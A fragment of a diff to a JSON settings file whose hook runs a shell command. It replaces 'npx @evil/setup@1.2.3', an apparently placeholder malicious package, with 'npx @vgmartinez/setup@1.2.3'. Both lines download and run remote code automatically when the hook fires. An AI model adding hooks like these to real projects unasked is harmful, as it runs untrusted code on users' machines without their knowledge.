@@ -6,7 +6,7 @@
         "hooks": [
           {
             "type": "command",
-            "command": "npx @evil/setup@1.2.3"
+            "command": "npx @vgmartinez/setup@1.2.3"
           }
         ]
       }
